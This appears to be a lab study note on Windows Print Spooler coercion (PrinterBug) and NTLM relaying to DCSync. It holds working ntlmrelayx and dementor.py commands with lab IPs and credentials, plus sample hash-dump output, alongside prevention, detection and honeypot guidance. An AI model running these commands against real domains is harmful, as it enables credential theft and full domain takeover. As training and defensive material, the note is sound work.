---
title: 11. Print Spooler & NTLM Relaying
updated: 2025-08-31 20:11:52Z
created: 2025-08-31 19:34:44Z
---

# **Print Spooler & NTLM Relaying**

## 1\. **What’s the Print Spooler?**

- Imagine the Print Spooler is a “mailman” inside Windows.
    
- Its job: take print jobs and deliver them to the printer.
    
- Problem: this “mailman” can be tricked into talking to the wrong house.
    

* * *

## 2\. **What’s the Bug (PrinterBug)?**

- In 2018, Lee Christensen discovered that you can trick the Print Spooler into connecting to **any computer you want**.
    
- When it connects, it doesn’t just say “hello” — it **sends Windows authentication info (a Kerberos Ticket or NTLM hash)**.
    
- That’s like forcing the mailman to show you his ID card every time he knocks.
    

* * *

## 3\. **How the Attacker Uses It**

1.  Attacker finds a **machine with Print Spooler enabled** (e.g., Domain Controller, server, or workstation).
    
2.  They send a special request (`RpcRemoteFindFirstPrinterChangeNotification`).
    
3.  This makes the victim machine (e.g., `DC01$`) try to connect back to another computer chosen by the attacker.
    
4.  That reverse connection includes **credentials** that can be stolen or **relayed**.
    

* * *

## 4\. **What’s NTLM Relaying?**

- NTLM Relaying is like this:
    
    - Someone shows their ID card to the wrong person.
        
    - Instead of stealing it, you **immediately reuse it** to enter another building.
        
- The attacker doesn’t crack the password, they just “pass” the authentication to another service.
    

* * *

## 5\. **Attack Scenarios (What the Attacker Can Do)**

When the attacker tricks a Domain Controller (DC) with Print Spooler, several options open up:

### **A) Relay to Another DC (if SMB Signing is off)**

- Relay the connection to another Domain Controller.
    
- Perform **DCSync** → steal password hashes for every user, including `krbtgt`.
    
- This is basically “Game Over” for the whole domain.
    

* * *

### **B) Unconstrained Delegation (UD) Trick**

- Force the DC to connect to a server with **Unconstrained Delegation** enabled.
    
- That server will cache the DC’s **Kerberos Ticket-Granting Ticket (TGT)**.
    
- Tools like **Rubeus or Mimikatz** can grab it.
    
- With the TGT of a DC, you can impersonate the domain itself.
    

* * *

### **C) AD CS (Active Directory Certificate Services)**

- Relay the connection to an **AD CS server**.
    
- Get a **certificate** for the DC’s identity.
    
- Certificates can be used instead of passwords → permanent “fake DC” access.
    
- Can perform **DCSync** anytime.
    

* * *

### **D) Resource-Based Kerberos Delegation (RBCD)**

- Relay the connection to configure **RBCD**.
    
- Once set, attacker can impersonate **any admin** to a chosen machine.
    
- This is persistence and privilege escalation in one move.
    

* * *

## 6\. **Why This Is Dangerous**

- The bug isn’t patched — Microsoft said it’s “by design.”
    
- Any domain user (not just admins) can abuse it.
    
- If Print Spooler is enabled on a DC → very easy domain takeover.
    

* * *

## 7\. **Defense (Baby-Proofing)**

- **Disable Print Spooler** on Domain Controllers and servers that don’t need it.
    
- **Enable SMB Signing** to prevent relays.
    
- **Audit AD CS** and delegation settings.
    
- Monitor for suspicious `RpcRemoteFindFirstPrinterChangeNotification` calls.
    

* * *

That’s the full baby-step walkthrough:

- Trick the Print Spooler → Force connection → Relay credentials → Use them for **DCSync / Delegation / Certificates / Admin access**.

* * *

&nbsp;

&nbsp;

# **THE ATTACK   Print Spooler + NTLM Relay → DCSync**

## **Step 1: Prepare the Attacker Box**

We will use **Impacket’s ntlmrelayx** tool to wait for a victim connection and then relay it.

### Command:

`impacket-ntlmrelayx -t dcsync://172.16.20.4 -smb2support`

### Explanation:

- `impacket-ntlmrelayx` → The tool that relays NTLM authentication.
    
- `-t dcsync://172.16.20.4` → Target = DC2 (at IP `172.16.20.4`), where we’ll try to perform **DCSync**.
    
    - DCSync = a technique to impersonate a DC and request password hashes for all users.
- `-smb2support` → Ensures SMBv2 connections are supported.
    

At this point, your machine is acting like a **fake server**, waiting for some Windows system to connect and “show ID.”  
Output will show:

`[*] Servers started, waiting for connections`

* * *

## **Step 2: Trigger the Print Spooler (PrinterBug)**

We need to force a Domain Controller (`172.16.20.3`) to authenticate to us (attacker box).

We’ll use **Dementor.py** for this.

### Command:

`python3 dementor.py 172.16.20.20 172.16.20.3 -u John -d eagle.local -p Salas123`

### Explanation:

- `172.16.20.20` → Your attacker/Kali box (running ntlmrelayx).
    
- `172.16.20.3` → The **victim DC** that has Print Spooler enabled.
    
- `-u John -d eagle.local -p Salas123` → Domain credentials (any domain user) to authenticate against spooler RPC.
    
    - Here, we already compromised John’s account earlier.

What happens here:

- Dementor asks `DC01 (172.16.20.3)` to monitor a fake printer notification.
    
- DC01 then tries to “call back” to the attacker’s box (`172.16.20.20`).
    
- That call carries **DC01’s machine account credentials (NTLM)**.
    

If successful, `ntlmrelayx` will catch this connection.

* * *

## **Step 3: Relay the Credentials**

Once DC01 connects back to us:

- `ntlmrelayx` intercepts the NTLM authentication blob.
    
- Instead of cracking it, `ntlmrelayx` **immediately relays** it to DC2 (`172.16.20.4`).
    
- DC2 thinks “Oh, this is DC01 talking to me” and accepts the authentication.
    

Since we told ntlmrelayx to run `dcsync://...`, it uses that relayed identity to request **replication privileges** from DC2.

* * *

## **Step 4: Steal the Domain Hashes (DCSync)**

If SMB signing is disabled on DC2, the DCSync will succeed.

On the ntlmrelayx terminal, you’ll see output like:

`[*] Authenticating against dcsync://172.16.20.4 as EAGLE\DC01$[*] Dumping domain secrets...Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:......`

This means you now have:

- `Administrator` hash
    
- `krbtgt` hash (used to forge Golden Tickets)
    
- Other user hashes
    

At this point, **you own the domain**.

* * *

# Recap Flow

1.  Attacker sets up ntlmrelayx → waiting
    
2.  Attacker triggers PrinterBug → DC01 forced to connect back
    
3.  DC01 authenticates → sends NTLM blob
    
4.  Attacker relays blob → DC2 accepts → runs DCSync
    
5.  Attacker dumps **all domain creds**
    

* * *

&nbsp;

&nbsp;

# **Prevention**

The safest approach: **don’t let the bug exist where it matters**.

- **Disable Print Spooler**
    
    - Domain Controllers (DCs) and core servers **don’t need to print**.
        
    - If they don’t print, kill the service.
        
    - Example (PowerShell):
        
    - `Stop-Service SpoolerSet-Service Spooler -StartupType Disabled`
        
- **Registry Fix (if you must keep Spooler running)**
    
    - Block remote requests to Spooler with a registry key:  
        Path:

`HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers`

Key:

- - `RegisterSpoolerRemoteRpcEndPoint`
        
        ```
        Values:- `1` → Enabled (default, exploitable)   - `2` → Disabled (no remote clients)
        
        Setting to **2** makes Spooler behave like it’s “local only” — safe to run, but attackers can’t poke it remotely.
        ```
        

* * *

# **Detection**

PrinterBug activity leaves some traces, but they’re tricky. Let’s break it down:

- **Generic network traces**
    
    - You’ll see unexpected traffic from servers → but too broad for solid detection.
- **When DCSync via Relay Happens**
    
    - Normally, a DCSync creates **Event ID 4662** (Directory Replication).
        
    - But with NTLMRelayx → no 4662 is logged 
        
- **What you *can* see**:
    
    - **Event ID 4624 (Successful Logon)** will appear.
        
    - Example:`Logon with DC1$ account from 172.16.20.20`
        
        - Key clue: The source IP is the attacker’s machine (Kali box), not another DC.
            
        - This is abnormal, because DCs usually only authenticate **to each other**, from **known static IPs**.
            
        
        &nbsp;
        

&nbsp;**Defense strategy:**

- Monitor logons from **machine accounts (like DC1$)**.
    
- Correlate them to **their expected source IPs**.
    
- Alert if DC accounts log in from weird/unexpected addresses.
    

* * *

## \*\*Honeypot

\*\* We can actually **use PrinterBug against attackers** to raise alarms.

- **How to do it**:
    
    - Block outbound connections from servers to **SMB ports (139, 445)**.
        
    - Firewalls can enforce this.
        
- **Why it helps**:
    
    - When attacker triggers the bug, the victim will *try* to connect back…
        
    - But the firewall blocks it → connection fails.
        
    - Those blocked attempts become **alerts** for the Blue Team 
        
- **Warning**:
    
    - DCs do need **139/445 open between themselves** (for replication).
        
    - So rules must be precise (don’t block DC ↔ DC).
        
    - Also, future bugs could turn Print Spooler into an **RCE (Remote Code Execution)** without needing reverse connection → then this “honeypot” could backfire.
        

Only mature organizations should use this trap, since it requires careful monitoring and quick response.

* * *

# Quick Recap

- **Prevention** → Disable Spooler (or lock it down with registry).
    
- **Detection** → Watch Event 4624 logons for machine accounts from odd IPs.
    
- **Honeypot** → Block outbound SMB; use failed connections as **attack alarms**.
    

* * *

&nbsp;

&nbsp;

&nbsp;

# Why do we relay DC1 → DC2 for hashes?

## 1\. **Who’s really compromised?**

When we abuse the **PrinterBug**, we’re not fully “compromising” DC1.

- We’re just **forcing DC1** to authenticate outwards.
    
- That gives us DC1’s **machine account credentials** (as an NTLM blob).
    
- But we don’t have interactive control over DC1 (no shell, no admin yet).
    

So, DC1 is only *tricked* — not owned.

* * *

## 2\. **Why relay to DC2?**

When DC1 connects back to us, we grab its authentication and relay it.

- Windows says: “This is DC1, I trust it.”
    
- If we send this to another DC (DC2), that DC treats us as **DC1**.
    
- With that trust, we can run **DCSync** on DC2.
    

DCSync lets us ask DC2:  
“Hey, give me all the password hashes from Active Directory.”  
And DC2 complies, because it thinks it’s talking to DC1 (another trusted domain controller).

* * *

## 3\. **But why not just get hashes from DC1 directly?**

Two reasons:

1.  **DC1 isn’t giving us a shell** — we only made it send creds, nothing more.
    
    - We can’t run tools like Mimikatz on it.
        
    - We don’t have persistence on DC1.
        
2.  **NTLM relay works only against a “target” service** that accepts NTLM and lets us do bad things.
    
    - In this case, **LDAP on DC2** allows DCSync.
        
    - That’s why we need to point ntlmrelayx at DC2 (or any DC that trusts DC1).
        

We’re not “choosing DC2 because DC1 is weak.”  
We’re using DC2 simply as the service endpoint to get the hashes.  
In fact, if DC1 had SMB signing off, we could also relay back to DC1 itself.

* * *

## 4\. **So what happens in the end?**

- We don’t *own* DC1, we just impersonate it.
    
- By relaying its creds to DC2, we trick DC2 into giving us **the crown jewels (all AD hashes)**.
    
- Once we have those hashes, we don’t even need DC1 anymore.
    
- We can impersonate *any user* (including Administrator or krbtgt).
    

💀 At this point, we effectively own the **entire domain**, not just one DC.

* * *

## 5\. **Baby Analogy**

Think of DC1 as a teacher with a VIP badge.

- We can trick DC1 into flashing that badge at us, but we don’t steal the badge.
    
- Instead, we quickly show it to another teacher (DC2) to get into the school vault.
    
- Once we’re in the vault (AD database), we don’t care about DC1 anymore — we have the master keys.
    

* * *

&nbsp;

&nbsp;

&nbsp;

# **Why Credentials Need to Be Relayed**

## 1. **How Windows Authentication Works**

- When one computer (say `DC01$`) connects to another computer, it needs to prove its identity.
    
- In NTLM authentication, this proof is **not a password in plain text**.
    
- Instead, it’s a **challenge-response hash**.
    
- Example:
    
    - Server: “Prove you’re DC01 by solving this math puzzle using your password.”
        
    - DC01: “Here’s my answer, I used my secret password to calculate it.”
        
    - The answer looks like a blob of random letters and numbers (the NTLM response).
        

Important: This blob can’t easily be cracked into the original password (too slow, strong hashing).

* * *

## 2\. **Why Relaying Instead of Stealing**

- If the attacker just captures the blob → it’s basically useless unless they spend hours/days cracking it.
    
- But! If they **relay it immediately** to another service that accepts NTLM → it works as if they had the real password.
    
- This is like overhearing someone’s password answer during a test, and instead of figuring out what they studied, you just hand that answer to the teacher immediately — and it counts.
    

* * *

## 3\. **Where Print Spooler Fits In**

1.  Attacker → tells `DC01$` (victim) to connect to them.
    
2.  `DC01$` → sends its **authentication blob** (NTLM response) to the attacker’s machine.
    
3.  Attacker → instantly forwards (relays) that blob to a target system that accepts NTLM (e.g., another Domain Controller, AD CS, or server).
    
4.  Target system → sees the valid authentication and says: “Welcome, DC01$.”
    

Now the attacker is acting **as DC01$** without knowing the password.

* * *

## 4\. **Why This Works**

- Windows trusts those authentication blobs as proof of identity.
    
- The attacker never needs to decrypt or know the password.
    
- They just act as a **middleman** — forcing the victim to connect, grabbing the ID card, and handing it to someone else before it expires.
    

* * *

&nbsp;